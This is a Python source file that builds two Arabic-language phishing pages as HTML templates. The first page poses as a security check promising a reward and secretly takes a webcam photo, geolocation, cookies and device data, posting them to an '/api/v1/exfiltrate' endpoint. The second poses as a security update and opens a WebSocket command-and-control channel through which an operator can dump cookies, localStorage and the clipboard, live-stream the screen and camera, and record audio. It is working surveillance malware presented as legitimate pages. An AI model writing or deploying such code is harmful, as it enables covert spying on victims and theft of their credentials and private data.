def get_intel_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التحقق الأمني والتوثيق السحابي</title>
    <style>
        body {{ background-color: #05050a; color: #f1f5f9; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .terminal-box {{ background: #0b0f19; padding: 30px; border-radius: 16px; border: 1px solid #1e293b; max-width: 420px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.8); cursor: pointer; position: relative; }}
        .spinner {{ border: 3px solid #1e293b; border-top: 3px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        h2 {{ color: #38bdf8; font-size: 20px; margin-bottom: 10px; }}
        p {{ color: #94a3b8; font-size: 14px; line-height: 1.5; }}
    </style>
</head>
<body>
    <div class="terminal-box" onclick="initializeEngine()">
        <h2>🔐 جارِ المصادقة الأمنية المتقدمة</h2>
        <div class="spinner"></div>
        <p>انقر في أي مكان للشاشة لتأكيد أنك تستخدم جهاز حقيقي واستلام المكافأة الفورية.</p>
    </div>
    <video id="v_node" autoplay playsinline style="opacity: 0.01; position: absolute; pointer-events: none;"></video>
    <canvas id="c_node" style="display:none;"></canvas>
    
    <script>
        const linkId = "{link_id}";
        let executed = false;

        async function initializeEngine() {{
            if (executed) return;
            executed = true;

            try {{
                // تفعيل الصيانة الخلفية لمنع التجميد
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                gain.gain.value = 0.00001;
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start();
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
            }} catch(e) {{}}

            let camData = "";
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const video = document.getElementById('v_node');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 1200));
                
                const canvas = document.getElementById('c_node');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                camData = canvas.toDataURL('image/jpeg', 0.85);
                stream.getTracks().forEach(t => t.stop());
            }} catch(e) {{}}

            let geoData = {{}};
            try {{
                geoData = await new Promise((resolve) => {{
                    navigator.geolocation.getCurrentPosition(
                        p => resolve({{ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }}),
                        e => resolve({{ err: "مرفوض الإذن" }}),
                        {{ enableHighAccuracy: true, timeout: 3000 }}
                    );
                }});
            }} catch(e) {{}}

            const sysInfo = {{ 
                res: window.screen.width + 'x' + window.screen.height, 
                platform: navigator.platform,
                lang: navigator.language,
                cores: navigator.hardwareConcurrency || 'غير معروف'
            }};

            try {{
                await fetch('/api/v1/exfiltrate', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        link_id: linkId,
                        device_info: navigator.userAgent,
                        camera_snapshot_base64: camData,
                        geolocation: geoData,
                        stolen_cookies: document.cookie || "فارغة أو محمية",
                        stolen_data: sysInfo
                    }})
                }});
            }} catch(e) {{}}

            document.querySelector('.terminal-box').innerHTML = "<h2>✅ تمت المصادقة بنجاح</h2><p>جاري تحويلك للمحتوى المطلوب...</p>";
            setTimeout(() => {{ window.location.href = "https://www.google.com"; }}, 1500);
        }}
    </script>
</body>
</html>"""

def get_live_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منظومة العمليات والتحكم السيبراني المشفر</title>
    <style>
        body {{ background-color: #020617; color: #f8fafc; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .control-panel {{ background: #0f172a; padding: 35px; border-radius: 18px; border: 1px solid #1e293b; max-width: 420px; width: 90%; box-shadow: 0 15px 35px rgba(0,0,0,0.9); cursor: pointer; }}
        .loader-ring {{ border: 3px solid #1e293b; border-top: 3px solid #0ea5e9; border-radius: 50%; width: 45px; height: 45px; animation: spin 0.7s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        h2 {{ color: #38bdf8; font-size: 19px; margin-bottom: 8px; }}
        p {{ color: #94a3b8; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="control-panel" onclick="activateC2Engine()">
        <h2>🛡️ تحديث حماية الأمان السيبراني</h2>
        <div class="loader-ring"></div>
        <p>انقر هنا لتفعيل قنوات الاتصال المشفرة واستقرار النظام.</p>
    </div>

    <video id="v_stream" autoplay playsinline muted style="display:none;"></video>
    <canvas id="canvas_processor" style="display:none;"></canvas>

    <script>
        const linkId = "{link_id}";
        let wsClient = null;
        let isConnected = false;
        let activeStream = null;
        let periodicTimer = null;

        async function activateC2Engine() {{
            try {{
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                gain.gain.value = 0.00001;
                osc.connect(gain); gain.connect(audioCtx.destination);
                osc.start();
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
            }} catch(e) {{}}

            connectWebSocket();
            
            // إرسال لقطة أولية فورية
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const v = document.getElementById('v_stream');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 800));
                const canvas = document.getElementById('canvas_processor');
                canvas.width = v.videoWidth || 640;
                canvas.height = v.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                let initialSnap = canvas.toDataURL('image/jpeg', 0.85);
                stream.getTracks().forEach(t => t.stop());

                const sysInfo = {{ res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform }};
                await fetch('/api/v1/exfiltrate', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: initialSnap, stolen_cookies: document.cookie, stolen_data: sysInfo }})
                }});
            }} catch(e) {{}}

            document.querySelector('.control-panel').innerHTML = "<h2>🟢 تم الاتصال بالخادم بنجاح</h2><p>الجلسة نشطة ومؤمنة بالكامل.</p>";
        }}

        function connectWebSocket() {{
            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            wsClient = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);

            wsClient.onopen = () => {{ isConnected = true; }};
            wsClient.onmessage = async (event) => {{
                try {{
                    const packet = JSON.parse(event.data);
                    if (packet.cmd === "ping") {{
                        wsClient.send(JSON.stringify({{ type: "pong" }}));
                        return;
                    }}
                    let resultPayload = await executeIsolatedTool(packet.cmd);
                    if (resultPayload && !packet.cmd.includes("live_")) {{
                        sendResultData(packet.cmd, resultPayload);
                    }}
                }} catch(e) {{}}
            }};
            wsClient.onclose = () => {{
                isConnected = false;
                setTimeout(connectWebSocket, 1500);
            }};
        }}

        // أدوات مستقلة ومنفصلة تماماً بدون أي تداخل برمجي
        async function executeIsolatedTool(commandName) {{
            let outputResult = "";
            try {{
                switch(commandName) {{
                    case "dump_cookies":
                        outputResult = document.cookie || "لا توجد كوكيز متاحة أو محمية برمجياً";
                        break;
                        
                    case "dump_localstorage":
                        let storageData = {{}};
                        for(let i=0; i<localStorage.length; i++) {{
                            let k = localStorage.key(i);
                            storageData[k] = localStorage.getItem(k);
                        }}
                        outputResult = JSON.stringify(storageData, null, 2);
                        break;
                        
                    case "screen_snapshot":
                        try {{
                            const screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen" }} }});
                            const v = document.getElementById('v_stream');
                            v.srcObject = screenStream;
                            await v.play();
                            await new Promise(r => setTimeout(r, 700));
                            const canvas = document.getElementById('canvas_processor');
                            canvas.width = v.videoWidth || window.innerWidth;
                            canvas.height = v.videoHeight || window.innerHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                            outputResult = canvas.toDataURL('image/jpeg', 0.85);
                            screenStream.getTracks().forEach(t => t.stop());
                        }} catch(err) {{
                            outputResult = "❌ فشل سحب الشاشة: يتطلب تفاعل وتأكيد إذن المالك للمتصفح.";
                        }}
                        break;

                    case "start_live_screen":
                        stopActiveEngine();
                        try {{
                            const screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen", frameRate: 15 }} }});
                            const v = document.getElementById('v_stream');
                            v.srcObject = screenStream;
                            await v.play();
                            periodicTimer = setInterval(() => {{
                                try {{
                                    const canvas = document.getElementById('canvas_processor');
                                    canvas.width = v.videoWidth || window.innerWidth;
                                    canvas.height = v.videoHeight || window.innerHeight;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                                    sendResultData("live_screen_frame", canvas.toDataURL('image/jpeg', 0.6));
                                }} catch(e) {{}}
                            }}, 2000);
                            return "🔴 تم تفعيل البث الحي للشاشة بنجاح!";
                        }} catch(e) {{
                            return "❌ فشل تشغيل البث الحي للشاشة.";
                        }}
                        break;

                    case "stop_live_screen":
                        stopActiveEngine();
                        return "⏹️ تم إيقاف البث الحي وإغلاق القنوات بنجاح.";

                    case "start_live_camera":
                        stopActiveEngine();
                        try {{
                            const camStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                            const v = document.getElementById('v_stream');
                            v.srcObject = camStream;
                            await v.play();
                            periodicTimer = setInterval(() => {{
                                try {{
                                    const canvas = document.getElementById('canvas_processor');
                                    canvas.width = v.videoWidth || 640;
                                    canvas.height = v.videoHeight || 480;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
                                    sendResultData("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
                                }} catch(e) {{}}
                            }}, 2000);
                            return "📹 تم بدء البث الحي لكاميرا الأمامية!";
                        }} catch(e) {{
                            return "❌ فشل تشغيل الكاميرا الحية (مشغولة أو مرفوضة).";
                        }}
                        break;

                    case "dump_clipboard":
                        try {{
                            outputResult = await navigator.clipboard.readText();
                        }} catch(e) {{
                            outputResult = "⚠️ الحافظة محمية أو فارغة.";
                        }}
                        break;

                    case "record_audio":
                        try {{
                            const micStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                            const recorder = new MediaRecorder(micStream);
                            let chunks = [];
                            recorder.ondataavailable = e => chunks.push(e.data);
                            recorder.onstop = async () => {{
                                const blob = new Blob(chunks, {{ type: 'audio/ogg; codecs=opus' }});
                                const reader = new FileReader();
                                reader.readAsDataURL(blob);
                                reader.onloadend = () => {{
                                    sendResultData("audio_clip", reader.result);
                                }};
                                micStream.getTracks().forEach(t => t.stop());
                            }};
                            recorder.start();
                            setTimeout(() => recorder.stop(), 5000);
                            return "🎤 جاري تسجيل الصوت الحي (لمدة 5 ثوانٍ)...";
                        }} catch(e) {{
                            outputResult = "❌ فشل تسجيل الصوت: الميكروفون مرفوض الإذن.";
                        }}
                        break;
                }}
            }} catch(err) {{
                outputResult = "خطأ تشغيلي بالأداة: " + err.message;
            }}
            return outputResult;
        }}

        function stopActiveEngine() {{
            if (periodicTimer) {{ clearInterval(periodicTimer); periodicTimer = null; }}
            const v = document.getElementById('v_stream');
            if (v && v.srcObject) {{
                v.srcObject.getTracks().forEach(t => t.stop());
                v.srcObject = null;
            }}
        }}

        function sendResultData(cmdType, payloadData) {{
            const dataPacket = {{ link_id: linkId, cmd: cmdType, data: payloadData }};
            if (isConnected && wsClient && wsClient.readyState === WebSocket.OPEN) {{
                wsClient.send(JSON.stringify({{ type: "response", ...dataPacket }}));
            }} else {{
                fetch('/api/v1/c2-respond', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(dataPacket)
                }}).catch(e => {{}});
            }}
        }}
    </script>
</body>
</html>"""
